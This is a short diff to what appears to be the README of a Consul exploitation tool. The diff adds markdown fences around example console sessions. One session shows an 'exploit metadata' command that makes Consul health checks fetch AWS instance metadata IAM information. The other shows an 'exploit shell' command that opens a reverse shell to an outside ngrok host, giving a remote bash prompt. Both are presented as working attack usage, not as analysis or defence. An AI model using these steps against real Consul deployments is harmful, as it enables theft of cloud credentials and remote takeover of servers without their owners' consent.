@@ -30,6 +30,7 @@ Version: 1.9.3
 Server: true
 ```
 
+```console
 Connected <http://127.0.0.1:8500>$ exploit metadata
 ----
 Check Registered
@@ -43,8 +44,10 @@ HTTP GET http://169.254.169.254/latest/meta-data/iam/info: 200 OK Output: {
 }
 Check Deregistered
 ---
+```
 
 (cmd ngrok-host ngrok-port local-port) ** can replace ngrok with external ip.
+```console
 Connected <http://127.0.0.1:8500>$ exploit shell 2.tcp.ngrok.io 18563 9000
 ----
 Check Registered
@@ -55,3 +58,4 @@ Check Deregistered
 Client 127.0.0.1:51771 connected.
 bash-$: whoami
 brian
+```
